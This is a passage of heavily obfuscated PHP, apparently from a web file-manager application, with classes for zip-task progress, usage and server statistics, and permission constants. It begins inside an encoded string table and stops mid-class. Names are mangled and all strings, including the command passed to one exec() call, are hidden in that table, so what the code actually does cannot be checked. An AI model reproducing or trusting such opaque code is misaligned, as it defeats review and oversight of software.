4e\x74\x35\xc7\x3b\xb5\xe4\x58\x23\xd0\x97\x2\x8b\x44\x30\x4c\xd3\x42\xee\x24\x9a\x5f\xf7\xb4\x5e\x2e\xe0\xed\x19\x2d\x61\x4f"."\x18\x4e\x66\x44\x3a\x6b\x55\x27\x56\xc3\xad\xaa\x41\x85\xf\xd5\x6e\xaf\xb7\x55\x6c\x4c\xbd\x27\x50\x51\x49\x55\x7b\x24\xd\x8f\xb4\x59\xa3\xc\x6d\x51\xcd\x62\x34\x9\x97\x14\x3c\xaf\xab\xec\xc"."\x43\x80\xcb\xd2\x24\x5c\xb6\x2a\x99\x15\x96\x4\x36\x52\x39\x47\xab\xd8\x33\x74\xaf\x7a\xf0\x40\x8a\x91\xad\xd1\x61\xcf\x59\x9f\x66\x9d\x69\x3c\x6b\x66\xae\xfe\x1c\x60\x9c\x37\x37\x11\x7b\xd4\x6e"."\x85\x90\x56\x78\x6e\xda\x6b\xb5\xa2\x66\xe6\x19\x5b\x21\x72\x7b\x76\x81\x5a\xb4\x96\xa5\xd4\xa0\xae\x94\x72\xcc\xa8\x7d\x22\x34\x32\xaa\xc9\xbc\x48\xab\xa1\x1f\x42\x3f\x89\xb7\x70\xd9\xb1\x55\x8d".base64_decode('ZFnZpLY6SrImZbDdeiIeuDxu4BcVmC9ARnQaLRhjQg+PqeHPcpH/SmmsZPItJSvULA==').base64_decode('sYp4yPKOc1VtbjQuVSRXszWtAnxYdlB9Si+whwBlcwp6rDIdI6O7/dnK/q1oOvtIQQ==')."\x12\x46\x7a\xe4\x80\x42\x92\xe1\xd2\x63\xa8\x21\x29\x23\x20\x60\xfb\x84\x48\x9e\xd6\x27\x31\x34\x2\x27\x5c\x96\x2f\x94\x8d\x80\x9b\xc\x7a\x9\x1a\xc6\x97\xed\xfc\xfa\x8b\xf8\x62\xa5\xdb\x2e\x4d"."\x4e\x99\x96\xe3\xc3\x69\x69\xb3\x4c\x7e\xdb\x4d\xc7\x11\x4a\x1\x54\x74\x40\x78\x45\xbc\x77\xfa\x24\x9d\x17\x14\x12\x77\x5d\xb8\x51\xe4\x12\x85\xa0\x2d\xa1\x3e\x24\x8\xd7\xb1\xf8\x4c\x9e\xd2\x69"."\52\241\131\256\10\276\234\341\21\171\153\204\153\331\316\212\347\342\130\0\320\1\170\330\234\144\116\245\260\161\276\150\217\270\276\321\274\374\240\140\145\0\25\145\15\36\342\2\301"."\xe\xd2\x94\x20\xbc\x96\xe0\x27\x75\xc0\x4b\x6d\x81\xd1\x72\xde\x55\x9c\xbe\x71\xc5\x35\x6d\x3f\xab\x6\x10\xe1\x8a\x2a\xa8\xab\x74\x22\x5b\x3\xd3\xa1\x54\x3a\x55\x95\xd4\x1b\x4a\xa5\x56\x25\x92".base64_decode('HdSzelUyKSVpRFUl9XYn4jOlRXpC0VhVGlaeiqvCPRlNivaSVpIbyJlaEQ2vFC0hdw==')."\335\342\146\240\74\142\62\201\77\273\71\111\151\5\46\7\220\314\164\365\242\360\113\47\312\270\305\33\362\274\332\314\201\44\17\270\237\51\362\350\50\62\204\205\212\260\342\123\34".base64_decode('6k6WAYo9zfN1z3lucXkfcF3yS3CyNgixkXBO3pMJYHbNAZKlytW3HCRVDABu2HEmaA==')."\315\215\232\303\322\55\6\75\361\200\45\54\14\251\244\334\106\303\256\144\107\313\327\274\353\246\322\103\274\372\205\134\357\177\3\15\135\16\332\244\256\0\0".""."".base64_decode(''), 10, -8))); goto E»ÚÂ©‘ŠŠ; Eº÷ùöóÚ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $îï˜øˆñ =& $_SERVER[³½¬ÚË¯]; parent::startAfter(); Hook::bind($îï˜øˆñ[1814], array($this, $îï˜øˆñ[1804])); Hook::bind($îï˜øˆñ[1806], array($this, $îï˜øˆñ[1807])); $»Öİ“Ëö =& $this->task; $»Öİ“Ëö[$îï˜øˆñ[1808]] = $îï˜øˆñ[1237]; if (!$»Öİ“Ëö[$îï˜øˆñ[1587]]) { $»Öİ“Ëö[$îï˜øˆñ[1587]] = LNG($îï˜øˆñ[1815]); } } protected function endAfter() { $ß£ôÌè =& $_SERVER[³½¬ÚË¯]; parent::endAfter(); Hook::unbind($ß£ôÌè[1814], array($this, $ß£ôÌè[1804])); Hook::unbind($ß£ôÌè[1806], array($this, $ß£ôÌè[1807])); } public function updateAfter() { $Àª÷êİ™ =& $_SERVER[³½¬ÚË¯]; $•—·¤î =& $this->task; if (!$•—·¤î[$Àª÷êİ™[822]] || !$•—·¤î[$Àª÷êİ™[799]]) { return; } if ($•—·¤î[$Àª÷êİ™[1808]] == $Àª÷êİ™[1237]) { $¿ªÜçÙÉ = $•—·¤î[$Àª÷êİ™[1744]]; if ($•—·¤î[$Àª÷êİ™[1745]] != $Àª÷êİ™[1237]) { $¿ªÜçÙÉ = 0; } $ÓÒ÷ÎŒÏ = ($•—·¤î[$Àª÷êİ™[1748]] + $¿ªÜçÙÉ) / $•—·¤î[$Àª÷êİ™[799]]; $•—·¤î[$Àª÷êİ™[1692]] = $ÓÒ÷ÎŒÏ * 0.3; } else { if ($•—·¤î[$Àª÷êİ™[1808]] == $Àª÷êİ™[357]) { $ÓÒ÷ÎŒÏ = $•—·¤î[$Àª÷êİ™[1691]] / $•—·¤î[$Àª÷êİ™[822]]; $•—·¤î[$Àª÷êİ™[1692]] = 0.3 + $ÓÒ÷ÎŒÏ * 0.5; } else { if ($•—·¤î[$Àª÷êİ™[1808]] == $Àª÷êİ™[107]) { $ÓÒ÷ÎŒÏ = 0; if ($•—·¤î[$Àª÷êİ™[1743]]) { $ÓÒ÷ÎŒÏ = $•—·¤î[$Àª÷êİ™[1744]] / $•—·¤î[$Àª÷êİ™[1743]]; } $•—·¤î[$Àª÷êİ™[1692]] = 0.3 + 0.5 + $ÓÒ÷ÎŒÏ * 0.2; } } } if ($•—·¤î[$Àª÷êİ™[1692]] > 0) { $Àİ—„î = timeFloat() - $•—·¤î[$Àª÷êİ™[1694]] - $•—·¤î[$Àª÷êİ™[1697]]; $•—·¤î[$Àª÷êİ™[1698]] = $Àİ—„î * (1 - $•—·¤î[$Àª÷êİ™[1692]]) / $•—·¤î[$Àª÷êİ™[1692]]; } } public function copyFileStart($‘ü­¤‹, $Ú¢ëç , $í¹®ú¨ù, $µ¥êëÔ¶, $É”–†´œ, $Øã¯üŸ‹) { $ÒªË©¨– =& $_SERVER[³½¬ÚË¯]; parent::copyFileStart($‘ü­¤‹, $Ú¢ëç , $í¹®ú¨ù, $µ¥êëÔ¶, $É”–†´œ, $Øã¯üŸ‹); $¡÷÷£ªˆ =& $this->task; if ($¡÷÷£ªˆ[$ÒªË©¨–[1808]] == $ÒªË©¨–[357]) { $¡÷÷£ªˆ[$ÒªË©¨–[1808]] = $ÒªË©¨–[107]; } $this->update(); } public function copyFileEnd($¡æÛÖøÖ, $”¹²€è¸, $Ä¡º¯®ô, $è®üÏà¸, $ÕÒŒ¾Ì‰, $Ô‹“áÖÆ) { $©ˆí ‚³ =& $_SERVER[³½¬ÚË¯]; $¥‘ü¾öº =& $this->task; $¥‘ü¾öº[$©ˆí ‚³[1744]] = $¥‘ü¾öº[$©ˆí ‚³[1743]]; $¥‘ü¾öº[$©ˆí ‚³[1748]] += $¥‘ü¾öº[$©ˆí ‚³[1743]]; $¥‘ü¾öº[$©ˆí ‚³[1745]] = $©ˆí ‚³[12]; $this->update(); } public function zipEvent($½è¢ÛÀ¸, $Ä¾Ù¦, $ŸŒ¦Şöˆ, $Ä¸İéÈ¿) { $ıå¸şè› =& $_SERVER[³½¬ÚË¯]; $™·¹ïÆğ =& $this->task; $™·¹ïÆğ[$ıå¸şè›[1741]] = get_path_this($Ä¾Ù¦); $™·¹ïÆğ[$ıå¸şè›[1743]] = $Ä¸İéÈ¿; $™·¹ïÆğ[$ıå¸şè›[1744]] = $ŸŒ¦Şöˆ; $™·¹ïÆğ[$ıå¸şè›[1107]] = $½è¢ÛÀ¸ == $ıå¸şè›[1816] ? $ıå¸şè›[1811] : $ıå¸şè›[1812]; $™·¹ïÆğ[$ıå¸şè›[1745]] = $ıå¸şè›[12]; $™·¹ïÆğ[$ıå¸şè›[799]] = $Ä¸İéÈ¿; $™·¹ïÆğ[$ıå¸şè›[1808]] = $ıå¸şè›[357]; $this->update(); } public function nameParse($–¾‚…‰) { $ÕÜÛâÅ‰ =& $_SERVER[³½¬ÚË¯]; $·³½Íïª =& $this->task; if ($·³½Íïª[$ÕÜÛâÅ‰[1691]] < $·³½Íïª[$ÕÜÛâÅ‰[822]]) { $ƒöéöÄ› = get_path_this($–¾‚…‰); if (strstr($ƒöéöÄ›, $ÕÜÛâÅ‰[10])) { $·³½Íïª[$ÕÜÛâÅ‰[1691]] += 1; } } if ($·³½Íïª[$ÕÜÛâÅ‰[1808]] == $ÕÜÛâÅ‰[1237]) { $·³½Íïª[$ÕÜÛâÅ‰[1808]] = $ÕÜÛâÅ‰[357]; } $·³½Íïª[$ÕÜÛâÅ‰[1741]] = $–¾‚…‰; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ó˜èÊ) { $×¾¾Ò =& $_SERVER[³½¬ÚË¯]; $¦Ğœõ’Ù = array($×¾¾Ò[631] => array($×¾¾Ò[33] => $×¾¾Ò[1817], $×¾¾Ò[317] => array($×¾¾Ò[239], $×¾¾Ò[801], $×¾¾Ò[1818], $×¾¾Ò[1819])), $×¾¾Ò[1820] => array($×¾¾Ò[33] => $×¾¾Ò[1821], $×¾¾Ò[317] => array($×¾¾Ò[239], $×¾¾Ò[799], $×¾¾Ò[1822], $×¾¾Ò[1823], $×¾¾Ò[1824]))); if (!isset($¦Ğœõ’Ù[$ó˜èÊ])) { return !1; } $this->optionType = $¦Ğœõ’Ù[$ó˜èÊ][$×¾¾Ò[33]]; $this->field = $¦Ğœõ’Ù[$ó˜èÊ][$×¾¾Ò[317]]; return !0; } public function listData($­ó‚ŞğÆ = false, $õ±şà°œ = "\155\x6f\144\151\x66\x79\124\151\155\x65", $ú¶‰çœ³ = false) { return parent::listData($­ó‚ŞğÆ, $õ±şà°œ, $ú¶‰çœ³); } public function trendList($›¹•™£ä) { $ïŒıñö– =& $_SERVER[³½¬ÚË¯]; $‡‘€ë§â = $this->listData(); if ($‡‘€ë§â) { $ç¿¼±áÖ = end($‡‘€ë§â); $á–’ïÊ§ = date($ïŒıñö–[1825], strtotime($ïŒıñö–[1826])); if ($ç¿¼±áÖ[$ïŒıñö–[239]] == $á–’ïÊ§) { return $‡‘€ë§â; } $À¸ÒŒÚú = strtotime($ç¿¼±áÖ[$ïŒıñö–[239]]); } if (!isset($À¸ÒŒÚú)) { $‰ŞªòÚ¼ = $›¹•™£ä == $ïŒıñö–[631] ? $ïŒıñö–[568] : $ïŒıñö–[861]; $À¸ÒŒÚú = Model($‰ŞªòÚ¼)->min($ïŒıñö–[215]); } $ÈÄÆéÑ = $ïŒıñö–[1827] . ucfirst($›¹•™£ä); $ªµ•®¯ = $this->dateList($À¸ÒŒÚú); foreach ($ªµ•®¯ as $á–’ïÊ§) { $this->{$ÈÄÆéÑ}($á–’ïÊ§); } return $this->listData(); } private function dateList($£—öŞ“) { $¹áÅ¿ô =& $_SERVER[³½¬ÚË¯]; $Œœ¾°Õş = $£—öŞ“; $°ØÙ¨«á = strtotime($¹áÅ¿ô[1826]); $–ñÙî•¾ = array(); while ($Œœ¾°Õş <= $°ØÙ¨«á) { $–ñÙî•¾[] = date($¹áÅ¿ô[1825], $Œœ¾°Õş); $Œœ¾°Õş = strtotime($¹áÅ¿ô[1828], $Œœ¾°Õş); } return $–ñÙî•¾; } public function _recordUser($‹Â£·•î = '') { $ªÒÌ¥Ê =& $_SERVER[³½¬ÚË¯]; $ù™€ıÅ† = strtotime(date($ªÒÌ¥Ê[1829], strtotime($‹Â£·•î))); $íŒ×òÜë = strtotime(date($ªÒÌ¥Ê[1830], strtotime($‹Â£·•î))); $ÂÆäÌ½Á = array($ªÒÌ¥Ê[215] => array($ªÒÌ¥Ê[1056], $íŒ×òÜë)); $ÄàåğÆ¼ = Model($ªÒÌ¥Ê[568])->where($ÂÆäÌ½Á)->count($ªÒÌ¥Ê[1690]); $ÂÆäÌ½Á[$ªÒÌ¥Ê[215]] = array($ªÒÌ¥Ê[377], array($ù™€ıÅ†, $íŒ×òÜë)); $Ÿ•¥Ë·à = Model($ªÒÌ¥Ê[568])->where($ÂÆäÌ½Á)->count($ªÒÌ¥Ê[1690]); $ÂÆäÌ½Á[$ªÒÌ¥Ê[33]] = $ªÒÌ¥Ê[1831]; $ºå‡úö = Model($ªÒÌ¥Ê[1832])->where($ÂÆäÌ½Á)->count($ªÒÌ¥Ê[1833]); $Òùµó÷ã = array($ªÒÌ¥Ê[239] => $‹Â£·•î, $ªÒÌ¥Ê[801] => (int) $ÄàåğÆ¼, $ªÒÌ¥Ê[1818] => (int) $Ÿ•¥Ë·à, $ªÒÌ¥Ê[1819] => (int) $ºå‡úö); return $this->insert($Òùµó÷ã); } public function _recordStore($æ£üÜ‰± = '') { $ÔôşçĞ… =& $_SERVER[³½¬ÚË¯]; $»£Õ‚Øù = strtotime(date($ÔôşçĞ…[1830], strtotime($æ£üÜ‰±))); $ßıÌºö¦ = array($ÔôşçĞ…[215] => array($ÔôşçĞ…[1056], $»£Õ‚Øù)); $‚Ïàïõ½ = Model($ÔôşçĞ…[512])->where($ßıÌºö¦)->sum($ÔôşçĞ…[76]); $ßıÌºö¦[$ÔôşçĞ…[453]] = 0; $§¥ÕÓõ = Model($ÔôşçĞ…[861])->where($ßıÌºö¦)->sum($ÔôşçĞ…[76]); $ßıÌºö¦[$ÔôşçĞ…[178]] = 1; $È¨ö‡Í– = Model($ÔôşçĞ…[861])->where($ßıÌºö¦)->sum($ÔôşçĞ…[76]); $ßıÌºö¦[$ÔôşçĞ…[178]] = 2; $À†°¯Ş = Model($ÔôşçĞ…[861])->where($ßıÌºö¦)->sum($ÔôşçĞ…[76]); $ºãºíŒĞ = array($ÔôşçĞ…[239] => $æ£üÜ‰±, $ÔôşçĞ…[799] => (int) $§¥ÕÓõ, $ÔôşçĞ…[1822] => (int) $‚Ïàïõ½, $ÔôşçĞ…[1823] => (int) $È¨ö‡Í–, $ÔôşçĞ…[1824] => (int) $À†°¯Ş); return $this->insert($ºãºíŒĞ); } public function trend($€¼´•¡§, $œõ™×ê) { $«£Ûğ‚ =& $_SERVER[³½¬ÚË¯]; if (!$this->init($€¼´•¡§)) { return !1; } $Ş×Æí = $this->trendList($€¼´•¡§); if ($Ş×Æí && $œõ™×ê != $«£Ûğ‚[1663]) { $×‡´—èÀ = $Ş×Æí[0][$«£Ûğ‚[239]]; $·ÑÀ‚™ß = $this->validDate($œõ™×ê, $×‡´—èÀ); $»Õ“í³ = array(); $äöç¼ = array_to_keyvalue($Ş×Æí, $«£Ûğ‚[239]); foreach ($·ÑÀ‚™ß as $Ì§º«Ë) { if (isset($äöç¼[$Ì§º«Ë])) { $ûô¥ê®Ÿ = $äöç¼[$Ì§º«Ë]; } else { $ûô¥ê®Ÿ = end($Ş×Æí); $ûô¥ê®Ÿ[$«£Ûğ‚[239]] = $Ì§º«Ë; if ($€¼´•¡§ == $«£Ûğ‚[631]) { $ûô¥ê®Ÿ[$«£Ûğ‚[1818]] = $ûô¥ê®Ÿ[$«£Ûğ‚[1819]] = 0; } } $»Õ“í³[] = $ûô¥ê®Ÿ; } $Ş×Æí = $»Õ“í³; } $›Æ¼ÃØÄ = array($«£Ûğ‚[631] => array($«£Ûğ‚[801] => LNG($«£Ûğ‚[1834]), $«£Ûğ‚[1818] => LNG($«£Ûğ‚[1835]), $«£Ûğ‚[1819] => LNG($«£Ûğ‚[1836])), $«£Ûğ‚[1820] => array($«£Ûğ‚[799] => LNG($«£Ûğ‚[1837]), $«£Ûğ‚[1822] => LNG($«£Ûğ‚[1838]), $«£Ûğ‚[1823] => LNG($«£Ûğ‚[1839]), $«£Ûğ‚[1824] => LNG($«£Ûğ‚[1840]))); $Äçí‘ñ‚ = array($«£Ûğ‚[631] => $«£Ûğ‚[1841], $«£Ûğ‚[1820] => $«£Ûğ‚[76]); if (empty($Ş×Æí)) { $Ì§º«Ë = date($«£Ûğ‚[1825], strtotime($«£Ûğ‚[1826])); $Êîœé—¼ = array($«£Ûğ‚[239] => $Ì§º«Ë); foreach ($›Æ¼ÃØÄ[$€¼´•¡§] as $øêºÎã => $ğ¥€Ÿ–) { $Êîœé—¼[$øêºÎã] = 0; } $Ş×Æí[] = $Êîœé—¼; } $÷’¯¿ƒ = array(); foreach ($Ş×Æí as $ğ¥€Ÿ–) { if ($€¼´•¡§ == $«£Ûğ‚[1820] && $ğ¥€Ÿ–[$«£Ûğ‚[1822]] > $ğ¥€Ÿ–[$«£Ûğ‚[799]]) { $ğ¥€Ÿ–[$«£Ûğ‚[1822]] = $ğ¥€Ÿ–[$«£Ûğ‚[799]]; } foreach ($›Æ¼ÃØÄ[$€¼´•¡§] as $øêºÎã => $€ŠòåÓ) { $ûô¥ê®Ÿ = array($«£Ûğ‚[239] => $ğ¥€Ÿ–[$«£Ûğ‚[239]], $«£Ûğ‚[1587] => $€ŠòåÓ); $ûô¥ê®Ÿ[$Äçí‘ñ‚[$€¼´•¡§]] = isset($ğ¥€Ÿ–[$øêºÎã]) ? $ğ¥€Ÿ–[$øêºÎã] : 0; $÷’¯¿ƒ[] = $ûô¥ê®Ÿ; } } return $÷’¯¿ƒ; } public function validDate($Ğë¾Éæ, $¨ØıÃ´¢) { $©º©¥îö =& $_SERVER[³½¬ÚË¯]; $çëš€Åñ = date($©º©¥îö[1825], strtotime($©º©¥îö[1826])); $€°‘ìÏ = array($çëš€Åñ); switch ($Ğë¾Éæ) { case $©º©¥îö[1670]: $¦ÍÊÇÏÓ = mktime(0, 0, 0, date($©º©¥îö[1842]), date($©º©¥îö[1403]) - date($©º©¥îö[1466]) + 7 - 7, date($©º©¥îö[1843])); $¹ÆŸ½Ìİ = 0; do { $áßóÙ•û = date($©º©¥îö[1825], $¦ÍÊÇÏÓ - 3600 * 24 * 7 * $¹ÆŸ½Ìİ); $€°‘ìÏ[] = $áßóÙ•û; $¹ÆŸ½Ìİ++; } while ($¨ØıÃ´¢ < $áßóÙ•û); break; case $©º©¥îö[1668]: $¹ÆŸ½Ìİ = 1; do { $ÎÌÃµÙ™ = date($©º©¥îö[1844], strtotime("\55\40{$¹ÆŸ½Ìİ}\40\155\x6f\156\x74\150\163")); $€°‘ìÏ[] = $ÎÌÃµÙ™; $¹ÆŸ½Ìİ++; } while ($¨ØıÃ´¢ < $ÎÌÃµÙ™); break; case $©º©¥îö[1845]: $‘Íí˜Ü = (int) date($©º©¥îö[1843], strtotime($¨ØıÃ´¢)); $ÔÒÍ‘‘ñ = (int) date($©º©¥îö[1843]); if ($‘Íí˜Ü >= $ÔÒÍ‘‘ñ) { break; } for ($‘Íí˜Ü; $‘Íí˜Ü < $ÔÒÍ‘‘ñ; $‘Íí˜Ü++) { $€°‘ìÏ[] = $‘Íí˜Ü . $©º©¥îö[1846]; } break; default: break; } if ($¨ØıÃ´¢ > end($€°‘ìÏ)) { array_pop($€°‘ìÏ); } sort($€°‘ìÏ); return $€°‘ìÏ; } public function listTable($½¿÷ò) { $ßĞ´ñé = ucfirst($½¿÷ò); return Model($ßĞ´ñé)->listData(); } public function option($¡¿úş¢ó) { $Å’¡È = $_SERVER[³½¬ÚË¯][1847] . ucfirst($¡¿úş¢ó); return $this->{$Å’¡È}(); } private function optionUser() { $ôõ’–²› =& $_SERVER[³½¬ÚË¯]; $Şƒ·×‹§ = Model($ôõ’–²›[568])->count($ôõ’–²›[1690]); $ì¹õĞï¬ = Model($ôõ’–²›[568])->where($ôõ’–²›[1848])->count($ôõ’–²›[1690]); $óİ€èà› = intval($GLOBALS[$ôõ’–²›[6]][$ôõ’–²›[393]][$ôõ’–²›[1642]]) / 3600; $½Ú½øï€ = strtotime("\x2d{$óİ€èà›}\x20\150\x6f\165\x72\163"); $÷ŸâƒÂ  = strtotime(date($ôõ’–²›[1829])); if ($½Ú½øï€ < $÷ŸâƒÂ ) { $½Ú½øï€ = $÷ŸâƒÂ ; } $±Õˆ¨Æë = array($ôõ’–²›[1849] => array($ôõ’–²›[1057], $½Ú½øï€)); $şëŠ—ô¾ = (int) Model($ôõ’–²›[568])->where($±Õˆ¨Æë)->count($ôõ’–²›[1690]); if (!$şëŠ—ô¾) { $şëŠ—ô¾ = 1; } $±Õˆ¨Æë = array($ôõ’–²›[1849] => array($ôõ’–²›[1057], $÷ŸâƒÂ )); $šÚŒ«ˆ± = Model($ôõ’–²›[568])->where($±Õˆ¨Æë)->count($ôõ’–²›[1690]); return array($ôõ’–²›[794] => (int) $Şƒ·×‹§, $ôõ’–²›[1850] => (int) ($Şƒ·×‹§ - $ì¹õĞï¬), $ôõ’–²›[1851] => (int) $ì¹õĞï¬, $ôõ’–²›[1852] => (int) $šÚŒ«ˆ±, $ôõ’–²›[1853] => $şëŠ—ô¾); } private function optionFile() { $³ÂÌõ =& $_SERVER[³½¬ÚË¯]; $ÕÄİ•Üò = $this->sourceSize(); $Ø‰ñÜ» = $ÕÄİ•Üò[$³ÂÌõ[76]]; $¯ØîÃ•Ü = $ÕÄİ•Üò[$³ÂÌõ[1822]]; $œÎ¹ÀÑ› = Model($³ÂÌõ[861])->where(array($³ÂÌõ[453] => 0))->count($³ÂÌõ[181]); $’ÍŠıåÌ = array($³ÂÌõ[453] => 0, $³ÂÌõ[215] => array($³ÂÌõ[1057], strtotime(date($³ÂÌõ[1829])))); $ËøŒ¦¸ = Model($³ÂÌõ[861])->where($’ÍŠıåÌ)->sum($³ÂÌõ[76]); $šàš§®Â = Model($³ÂÌõ[861])->where($’ÍŠıåÌ)->count($³ÂÌõ[181]); return array($³ÂÌõ[799] => $Ø‰ñÜ», $³ÂÌõ[1822] => $¯ØîÃ•Ü, $³ÂÌõ[1854] => $Ø‰ñÜ» - $¯ØîÃ•Ü, $³ÂÌõ[1855] => (int) $ËøŒ¦¸, $³ÂÌõ[801] => (int) $œÎ¹ÀÑ›, $³ÂÌõ[1856] => (int) $šàš§®Â); } private function optionAccess() { $Ïø ã¢½ =& $_SERVER[³½¬ÚË¯]; return array($Ïø ã¢½[794] => $this->typeLogCnt(), $Ïø ã¢½[107] => $this->typeLogCnt($Ïø ã¢½[107]), $Ïø ã¢½[493] => $this->typeLogCnt($Ïø ã¢½[493]), $Ïø ã¢½[1857] => $this->typeLogCnt($Ïø ã¢½[1857]), $Ïø ã¢½[1858] => $this->typeLogCnt($Ïø ã¢½[1858]), $Ïø ã¢½[631] => $this->typeLogCnt($Ïø ã¢½[12], $Ïø ã¢½[1833])); } private function typeLogCnt($ƒ«àŒ–û = '', $°¬ÄÒÚĞ = "\151\144") { $ì¬õËÕ¾ =& $_SERVER[³½¬ÚË¯]; $»…ñÙâ¯ = array($ì¬õËÕ¾[107] => array($ì¬õËÕ¾[1859], $ì¬õËÕ¾[1860]), $ì¬õËÕ¾[493] => array($ì¬õËÕ¾[1861], $ì¬õËÕ¾[1862]), $ì¬õËÕ¾[1857] => array($ì¬õËÕ¾[1863], $ì¬õËÕ¾[1864], $ì¬õËÕ¾[1865]), $ì¬õËÕ¾[1858] => array($ì¬õËÕ¾[1866], $ì¬õËÕ¾[1867]), $ì¬õËÕ¾[1868] => array($ì¬õËÕ¾[1869], $ì¬õËÕ¾[1870], $ì¬õËÕ¾[1871])); $ªÌ­¿é– = strtotime(date($ì¬õËÕ¾[1829])); $ªß­üÛ² = array($ì¬õËÕ¾[215] => array($ì¬õËÕ¾[1057], $ªÌ­¿é–)); if ($ƒ«àŒ–û) { $ªß­üÛ²[$ì¬õËÕ¾[33]] = array($ì¬õËÕ¾[7], $»…ñÙâ¯[$ƒ«àŒ–û]); } $ò®‚½¸õ = Model($ì¬õËÕ¾[1832])->where($ªß­üÛ²)->count($°¬ÄÒÚĞ); return (int) $ò®‚½¸õ; } private function optionServer() { $ÊšüÇ¤Ù =& $_SERVER[³½¬ÚË¯]; $ÀŒ ×—İ = $this->diskDriver(); $¢ú•Ş« = KodIO::defaultDriver(); $£®Ë¡¨œ = array($ÊšüÇ¤Ù[853] => $¢ú•Ş«[$ÊšüÇ¤Ù[443]]); $óû˜–ı = Model($ÊšüÇ¤Ù[512])->where($£®Ë¡¨œ)->sum($ÊšüÇ¤Ù[76]); $ë„Í–É = explode($ÊšüÇ¤Ù[53], $_SERVER[$ÊšüÇ¤Ù[144]]); $‹½ğ¿ = $ë„Í–É[0]; $ªÓ•ïè— = $GLOBALS[$ÊšüÇ¤Ù[6]][$ÊšüÇ¤Ù[21]]; $¶ë¦ÊÄ = $ªÓ•ïè—[$ÊšüÇ¤Ù[1019]]; if ($¶ë¦ÊÄ == $ÊšüÇ¤Ù[1007]) { $€®ş™Ö = explode($ÊšüÇ¤Ù[1325], $ªÓ•ïè—[$ÊšüÇ¤Ù[1018]]); $¶ë¦ÊÄ = $€®ş™Ö[0]; } if ($¶ë¦ÊÄ == $ÊšüÇ¤Ù[955] || $¶ë¦ÊÄ == $ÊšüÇ¤Ù[840]) { $û†›½Õİ = Model()->db()->query($ÊšüÇ¤Ù[1872]); $ô³úù®ã = $û†›½Õİ[0] && isset($û†›½Õİ[0][$ÊšüÇ¤Ù[1586]]) ? $û†›½Õİ[0][$ÊšüÇ¤Ù[1586]] : 0; $¶ë¦ÊÄ = $ÊšüÇ¤Ù[1873] . ($ô³úù®ã ? $ÊšüÇ¤Ù[8] . $ô³úù®ã : $ÊšüÇ¤Ù[12]); } $Û‡ğî = $GLOBALS[$ÊšüÇ¤Ù[6]][$ÊšüÇ¤Ù[393]][$ÊšüÇ¤Ù[863]]; return array($ÊšüÇ¤Ù[1874] => $ÀŒ ×—İ ? $ÀŒ ×—İ[$ÊšüÇ¤Ù[1875]] : 0, $ÊšüÇ¤Ù[1876] => $ÀŒ ×—İ ? $ÀŒ ×—İ[$ÊšüÇ¤Ù[1877]] : 0, $ÊšüÇ¤Ù[1878] => (int) $¢ú•Ş«[$ÊšüÇ¤Ù[1875]] * 1024 * 1024 * 1024, $ÊšüÇ¤Ù[1879] => (int) $óû˜–ı, $ÊšüÇ¤Ù[1880] => ucfirst($‹½ğ¿), $ÊšüÇ¤Ù[1881] => $ÊšüÇ¤Ù[1882] . PHP_VERSION, $ÊšüÇ¤Ù[1883] => phpBuild64() ? 64 : 32, $ÊšüÇ¤Ù[793] => str_replace($ÊšüÇ¤Ù[1173], $ÊšüÇ¤Ù[1035], $¶ë¦ÊÄ), $ÊšüÇ¤Ù[393] => ucfirst($Û‡ğî), $ÊšüÇ¤Ù[32] => $_SERVER[$ÊšüÇ¤Ù[1884]]); } private function diskDriver() { $ãñ–ş¡ =& $_SERVER[³½¬ÚË¯]; $œ–Ü«ú = $ãñ–ş¡[8]; $Ä„é‡·› = $GLOBALS[$ãñ–ş¡[6]][$ãñ–ş¡[1342]] == $ãñ–ş¡[1343]; if ($Ä„é‡·›) { $œ–Ü«ú = $ãñ–ş¡[1885]; if (function_exists($ãñ–ş¡[1886])) { exec($ãñ–ş¡[1887], $ù½¨‡€); $œ–Ü«ú = $ù½¨‡€[1] . $ãñ–ş¡[8]; } } if (!file_exists($œ–Ü«ú)) { return; } $¸¯ÀÄÖî = @disk_total_space($œ–Ü«ú); $£Ÿ“ÊÖ = $¸¯ÀÄÖî - @disk_free_space($œ–Ü«ú); return array($ãñ–ş¡[1875] => $¸¯ÀÄÖî, $ãñ–ş¡[1877] => $£Ÿ“ÊÖ); } public function fileChart($Â¶ì¦´ò) { $ä¶Ü¬«Á =& $_SERVER[³½¬ÚË¯]; if (isset($Â¶ì¦´ò[$ä¶Ü¬«Á[1690]])) { return Model($ä¶Ü¬«Á[861])->userFileTypeProfile($Â¶ì¦´ò[$ä¶Ü¬«Á[1690]]); } if (isset($Â¶ì¦´ò[$ä¶Ü¬«Á[1888]])) { return Model($ä¶Ü¬«Á[861])->groupFileTypeProfile($Â¶ì¦´ò[$ä¶Ü¬«Á[1888]]); } $Ê·³ù¯¿ = $this->sourceSize(); $×¼˜ã©» = array($ä¶Ü¬«Á[180] => 0, $ä¶Ü¬«Á[178] => 1); $˜°ŞÂÍ¶ = Model($ä¶Ü¬«Á[861])->where($×¼˜ã©»)->sum($ä¶Ü¬«Á[76]); $×¼˜ã©»[$ä¶Ü¬«Á[178]] = 2; $©¸½ÃÛ‘ = Model($ä¶Ü¬«Á[861])->where($×¼˜ã©»)->sum($ä¶Ü¬«Á[76]); return array($ä¶Ü¬«Á[799] => $Ê·³ù¯¿[$ä¶Ü¬«Á[76]], $ä¶Ü¬«Á[1822] => $Ê·³ù¯¿[$ä¶Ü¬«Á[1822]], $ä¶Ü¬«Á[1823] => (int) $˜°ŞÂÍ¶, $ä¶Ü¬«Á[1824] => (int) $©¸½ÃÛ‘); } private function sourceSize() { $š‹¸ì—Ë =& $_SERVER[³½¬ÚË¯]; $Ö¤¾î•¸ = Model($š‹¸ì—Ë[861])->where(array($š‹¸ì—Ë[453] => 0))->sum($š‹¸ì—Ë[76]); $Òœ£ØÁ— = Model($š‹¸ì—Ë[512])->sum($š‹¸ì—Ë[76]); if ($Òœ£ØÁ— > $Ö¤¾î•¸) { $Òœ£ØÁ— = $Ö¤¾î•¸; } return array($š‹¸ì—Ë[76] => (int) $Ö¤¾î•¸, $š‹¸ì—Ë[1822] => (int) $Òœ£ØÁ—); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const 